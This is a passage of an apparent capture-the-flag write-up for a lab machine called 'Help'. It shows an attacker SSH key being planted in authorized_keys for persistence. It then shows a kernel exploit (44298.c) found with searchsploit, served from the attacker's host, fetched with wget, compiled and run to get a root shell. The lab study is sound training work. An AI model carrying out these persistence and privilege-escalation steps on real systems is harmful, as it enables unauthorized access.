+                $&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAACAQDubnsite6+BZra+1yAChYHV4ar8P0vkke1IWlZLwGP85bThoKe+pICmD15nweBXA4Rp5UMfJLBzBtXMN+QhVXBvkzAzTHeOIFAxBY/VE6FSBOTGYs+Q77Hnwdt7gIqqmXmUTpOwM0bPxnJTAh6L7lP9D+k+PK060BwmAmiPRHLyKa0KTbIRilRQZB4G8Fb9DOAweXr+r8d0Bw7/rUD3tUfSO2qcyuh2D7yQbCrwj1orYcj9r1ApYdPAZtqDmKknMtVGFjUVBIoti9iVZ6DD75lfRHclyqChgKDt2d7D0nDfTED2PaaoEG6vmGfHp51cNA21Fdh71mR1gE5T9V2IoCFujN7Ls7WSHn+K+q0s4m2VMgMYe1GT9+dxKIkYrqIs72m5Qt2GA8CarPatG2ZQ109/KZc9p9so7lpTJlxbiQg58CkwpFIBP0uXj9CHMPnG7D5Cr3eaz8sU3egyflT4YaXx1PB2IdrACorukDtgDpxKWRVFduyf7qLhR9Yjsr358cgaBRh89V+RImmhVrioQOx9brl70NbNO/jgav7ACo8/P0wk2WzDGB6W05y+pagAAhu4zdsksXyB/VImOZ4Sx9dzJTyBUnjIWIbKDmS+m+H28Vkm2rzLYefSxPNMBtuMquvCuZV15mHMx97MDRF/qxeNiKUpFG2kX0FF7eYCI2BVw==&nbsp;root@kali"</span>&nbsp;&gt;&nbsp;authorized_keys<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;600&nbsp;authorized_keys<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;..<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;700&nbsp;.ssh
+            </div>
+        </div><br>
+        <br>
+        Now ssh as user <code>help</code> using your private key and you'll have a fully functional ssh shell:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.ssh#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;-i&nbsp;~<span style="color:#ff9d00;font-weight:700">/</span>.ssh<span style="color:#ff9d00;font-weight:700">/</span>id_rsa&nbsp;help@10.10.10.121<br>
+                Welcome&nbsp;to&nbsp;Ubuntu&nbsp;16.04.5&nbsp;LTS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GNU<span style="color:#ff9d00;font-weight:700">/</span>Linux&nbsp;4.4.0-116-generic&nbsp;x86_64<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                &nbsp;*&nbsp;Documentation<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>help.ubuntu.com<br>
+                &nbsp;*&nbsp;Management<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>landscape.canonical.com<br>
+                &nbsp;*&nbsp;Support<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>ubuntu.com<span style="color:#ff9d00;font-weight:700">/</span>advantage<br>
+                You&nbsp;have&nbsp;new&nbsp;mail.<br>
+                Last&nbsp;<span style="color:#ff9d00;font-weight:700">login:</span>&nbsp;Fri&nbsp;Jan&nbsp;11&nbsp;06<span style="color:#ff9d00;font-weight:700">:</span>18<span style="color:#ff9d00;font-weight:700">:</span>50&nbsp;2019<br>
+                help@help<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;user.txt<br>
+                [flag&nbsp;redacted&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>)]<br>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Kernel privesc</strong></h2><br>
+        Gather some info:<br>
+            <div class="codebox">
+                help@help<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>issue<br>
+                Ubuntu&nbsp;16.04.5&nbsp;LTS&nbsp;<span style="color:#333333;font-weight:400">\n</span>&nbsp;<span style="color:#333333;font-weight:400">\l</span><br>
+                help@help<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>*-release<br>
+                <span style="color:#7f0044;font-weight:400">DISTRIB_ID</span>=Ubuntu<br>
+                <span style="color:#7f0044;font-weight:400">DISTRIB_RELEASE</span>=16.04<br>
+                <span style="color:#7f0044;font-weight:400">DISTRIB_CODENAME</span>=xenial<br>
+                <span style="color:#7f0044;font-weight:400">DISTRIB_DESCRIPTION</span>=<span style="color:#3ad900;font-weight:400">"Ubuntu&nbsp;16.04.5&nbsp;LTS"</span><br>
+                <span style="color:#7f0044;font-weight:400">NAME</span>=<span style="color:#3ad900;font-weight:400">"Ubuntu"</span><br>
+                <span style="color:#7f0044;font-weight:400">VERSION</span>=<span style="color:#3ad900;font-weight:400">"16.04.5&nbsp;LTS&nbsp;(Xenial&nbsp;Xerus)"</span><br>
+                <span style="color:#7f0044;font-weight:400">ID</span>=ubuntu<br>
+                <span style="color:#7f0044;font-weight:400">ID_LIKE</span>=debian<br>
+                <span style="color:#7f0044;font-weight:400">PRETTY_NAME</span>=<span style="color:#3ad900;font-weight:400">"Ubuntu&nbsp;16.04.5&nbsp;LTS"</span><br>
+                <span style="color:#7f0044;font-weight:400">VERSION_ID</span>=<span style="color:#3ad900;font-weight:400">"16.04"</span><br>
+                <span style="color:#7f0044;font-weight:400">HOME_URL</span>=<span style="color:#3ad900;font-weight:400">"http://www.ubuntu.com/"</span><br>
+                <span style="color:#7f0044;font-weight:400">SUPPORT_URL</span>=<span style="color:#3ad900;font-weight:400">"http://help.ubuntu.com/"</span><br>
+                <span style="color:#7f0044;font-weight:400">BUG_REPORT_URL</span>=<span style="color:#3ad900;font-weight:400">"http://bugs.launchpad.net/ubuntu/"</span><br>
+                <span style="color:#7f0044;font-weight:400">VERSION_CODENAME</span>=xenial<br>
+                <span style="color:#7f0044;font-weight:400">UBUNTU_CODENAME</span>=xenial<br>
+                help@help<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">uname</span>&nbsp;-mrs<br>
+                Linux&nbsp;4.4.0-116-generic&nbsp;x86_64
+            </div>
+        </div><br>
+        <br>
+        Any available exploits for the kernel version?<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help<span style="color:#ff9d00;font-weight:700">/</span>exploit#&nbsp;searchsploit&nbsp;Linux&nbsp;4.4.0-116<br>
+                --------------------------------------------------------------------&nbsp;<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                --------------------------------------------------------------------&nbsp;<br>
+                Linux&nbsp;Kernel&nbsp;&lt;&nbsp;4.4.0-116&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;16.04.4<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;Local&nbsp;Privilege&nbsp;Escalat&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>44298.c<br>
+                --------------------------------------------------------------------&nbsp;<br>
+            </div>
+        </div><br>
+        <br>
+        Get the exploit and serve it to the target:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help<span style="color:#ff9d00;font-weight:700">/</span>exploit#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>44298.c&nbsp;.<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>help<span style="color:#ff9d00;font-weight:700">/</span>exploit#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Download the exploit onto your target machine and run it!<br>
+            <div class="codebox">
+                help@help<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;wavey<br>
+                help@help<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;wavey<br>
+                help@help<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>wavey$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.13.79<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>44298.c<br>
+                --2019-05-15&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>26<span style="color:#ff9d00;font-weight:700">:</span>01--&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.13.79<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>44298.c<br>
+                Connecting&nbsp;to&nbsp;10.10.13.79<span style="color:#ff9d00;font-weight:700">:</span>8000...&nbsp;connected.<br>
+                HTTP&nbsp;request&nbsp;sent,&nbsp;awaiting&nbsp;response...&nbsp;200&nbsp;OK<br>
+                Length<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;6021&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>5.9K<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[text<span style="color:#ff9d00;font-weight:700">/</span>plain]<br>
+                Saving&nbsp;to<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;‘44298.c’<br>
+                <br>
+                44298.c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%[========================================&gt;]&nbsp;&nbsp;&nbsp;5.88K&nbsp;&nbsp;--.-KB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;0.02s&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                2019-05-15&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>26<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>374&nbsp;KB<span style="color:#ff9d00;font-weight:700">/</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;‘44298.c’&nbsp;saved&nbsp;[6021<span style="color:#ff9d00;font-weight:700">/</span>6021]<br>
+                <br>
+                help@help<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>wavey$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                44298.c<br>
+                help@help<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>wavey$&nbsp;<span style="color:#ff9d00;font-weight:700">gcc</span>&nbsp;44298.c&nbsp;-o&nbsp;makewave<br>
+                help@help<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>wavey$&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>makewave<br>
+                task_struct&nbsp;=&nbsp;ffff88003be7aa00<br>
+                uidptr&nbsp;=&nbsp;ffff88003b3806c4<br>
+                spawning&nbsp;root&nbsp;shell<br>
+                root@help<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>wavey#&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>,4<span style="color:#ff9d00;font-weight:700">(</span>adm<span style="color:#ff9d00;font-weight:700">)</span>,24<span style="color:#ff9d00;font-weight:700">(</span>cdrom<span style="color:#ff9d00;font-weight:700">)</span>,30<span style="color:#ff9d00;font-weight:700">(</span>dip<span style="color:#ff9d00;font-weight:700">)</span>,33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>,46<span style="color:#ff9d00;font-weight:700">(</span>plugdev<span style="color:#ff9d00;font-weight:700">)</span>,114<span style="color:#ff9d00;font-weight:700">(</span>lpadmin<span style="color:#ff9d00;font-weight:700">)</span>,115<span style="color:#ff9d00;font-weight:700">(</span>sambashare<span style="color:#ff9d00;font-weight:700">)</span>,1000<span style="color:#ff9d00;font-weight:700">(help)</span><br>
+                root@help<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<br>
+                root@help<span style="color:#ff9d00;font-weight:700">:/</span>root#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                root.txt<br>
+                root@help<span style="color:#ff9d00;font-weight:700">:/</span>root#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;root.txt<br>
+                [flag&nbsp;redacted&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>)]
+            </div>
+        </div><br>
+        <br>
+        Enumerating the box it look like there were lots of other potential methods to get root/avenues to take - probably worth exploring.
+    </writeup>
+</section>
+
+</body>
+</html>
